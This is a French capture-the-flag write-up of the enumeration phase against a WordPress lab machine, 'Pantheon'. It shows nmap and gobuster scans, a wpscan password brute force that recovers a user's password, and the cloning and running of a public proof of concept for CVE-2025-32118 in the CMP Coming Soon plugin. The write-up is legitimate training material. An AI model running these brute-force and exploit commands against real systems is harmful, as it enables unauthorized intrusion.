# Énumération

## 🔍 Phase 1 : Reconnaissance Initiale

### Énumération Réseau

Commençons par découvrir les machines présentes sur le réseau cible.

```bash
# Scan de découverte du réseau
nmap -sn 192.168.56.1/24

# Résultat
Starting Nmap 7.93 ( https://nmap.org ) at 2025-06-22 14:02 CEST
Nmap scan report for 192.168.56.10
Host is up (0.00018s latency).
```

!!! success "Découverte"
    Une seule machine est visible sur le réseau : **192.168.56.10**

### Scan Complet de la Machine Cible

```bash
# Scan complet avec détection de services
nmap -sC -sV -p- 192.168.56.10

# Résultat
Nmap scan report for pantheon.god (192.168.56.10)
Host is up (0.0011s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 6.8.1
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Pantheon
```

!!! info "Services Découverts"
    - **Port 22** : SSH (OpenSSH 7.6p1)
    - **Port 80** : HTTP (Apache 2.4.29 + WordPress 6.8.1)

## 🌐 Énumération Web

### Accès au Site Web

En accédant au port 80, nous sommes redirigés vers `pantheon.god`. Le site utilise WordPress 6.8.1.

### Énumération WordPress avec WPScan

```bash
# Scan agressif des plugins
wpscan --url "http://192.168.56.10/" --plugins-detection aggressive
```

#### Résultats Importants

!!! warning "Vulnérabilités Découvertes"
    - **Plugin CMP Coming Soon** : Version 4.1.13 (obsolète, dernière version 4.1.15)
    - **Directory listing** activé sur `/wp-content/uploads/`
    - **XML-RPC** activé
    - **WP-Cron** activé

#### Détails du Plugin Vulnérable

```bash
[+] cmp-coming-soon-maintenance
 | Location: http://pantheon.god/wp-content/plugins/cmp-coming-soon-maintenance/
 | Last Updated: 2025-04-30T08:07:00.000Z
 | Readme: http://pantheon.god/wp-content/plugins/cmp-coming-soon-maintenance/readme.txt
 | [!] The version is out of date, the latest version is 4.1.15
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 | - http://pantheon.god/wp-content/plugins/cmp-coming-soon-maintenance/, status: 200
 |
 | Version: 4.1.13 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 | - http://pantheon.god/wp-content/plugins/cmp-coming-soon-maintenance/readme.txt
```

### Énumération de Répertoires

```bash
# Énumération des répertoires avec gobuster
gobuster dir -w /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -u http://olympe.god/wp-content \
  -x txt,html,php
```

#### Découverte Critique

!!! success "Fichier Important Trouvé"
    ```
    /notes.txt            (Status: 200) [Size: 391]
    ```

### Analyse du Fichier Notes.txt

```bash
# Contenu du fichier notes.txt
curl http://olympe.god/wp-content/notes.txt
```

!!! tip "Indice Important"
    Le fichier contient une note indiquant que tous les dieux devaient changer leurs mots de passe et mettre un `y`, mais seul Hermès ne l'a pas fait.

## 🔐 Recherche de Credentials

### Brute Force sur WordPress

Basé sur l'indice trouvé, nous tentons un brute force sur l'utilisateur `hermes` :

```bash
# Brute force avec rockyou.txt
wpscan --url http://192.168.56.10 \
  --usernames hermes \
  --passwords /usr/share/wordlists/rockyou.txt
```

!!! success "Credentials Trouvés"
    - **Utilisateur** : hermes
    - **Mot de passe** : mondieu

## 🎯 Analyse de la Vulnérabilité CMP Coming Soon

### Recherche de POC

La version 4.1.13 du plugin CMP Coming Soon est vulnérable. Nous trouvons un POC sur GitHub :

```bash
# Téléchargement du POC
git clone https://github.com/Nxploited/CVE-2025-32118
cd CVE-2025-32118
```

### Vérification de la Vulnérabilité

```bash
# Test du POC
python3 CVE-2025-32118.py -u http://olympe.god/wordpress -un hermes -p mondieu
```

!!! warning "Vulnérabilité Confirmée"
    Le plugin permet un bypass d'authentification et l'upload de fichiers malveillants.

## 📊 Résumé de l'Énumération

### Points d'Entrée Identifiés

| Service | Vulnérabilité | Vecteur d'Attaque |
|---------|---------------|-------------------|
| **WordPress** | Plugin CMP Coming Soon 4.1.13 | Authentification bypass |
| **SSH** | Credentials faibles | Brute force possible |
| **Apache** | Directory listing | Information disclosure |

### Credentials Découverts

| Utilisateur | Mot de Passe | Source |
|-------------|--------------|--------|
| **hermes** | mondieu | Brute force WordPress |

### Fichiers Sensibles

- `/wp-content/notes.txt` : Indices sur les credentials
- `/wp-content/uploads/` : Directory listing activé
- `/wp-content/plugins/cmp-coming-soon-maintenance/` : Plugin vulnérable

## 🎭 Contexte Mythologique

### Hermès - Le Messager Vulnérable

Dans la mythologie grecque, Hermès est le messager des dieux, rapide et rusé. Dans notre lab :

- **Vulnérabilité** : Credentials faibles (hermes:y → hermes:mondieu)
- **Rôle** : Point d'entrée vers l'Olympe numérique
- **Scénario** : Intercepter les messages divins pour accéder au royaume

### Indices Thématiques

Le fichier `notes.txt` fait référence à un décret de Zeus demandant aux dieux de changer leurs mots de passe, créant un contexte narratif cohérent avec la thématique mythologique.

## 🚀 Prochaines Étapes

Avec ces informations, nous pouvons maintenant :

1. **Exploiter la vulnérabilité CMP Coming Soon**
2. **Obtenir un shell sur la machine**
3. **Élever nos privilèges vers l'utilisateur hermes**
4. **Explorer l'environnement pour d'autres vecteurs**

---

*L'énumération révèle les premières failles dans la défense de l'Olympe. Hermès, le messager divin, a laissé ses secrets exposés...* ⚡ 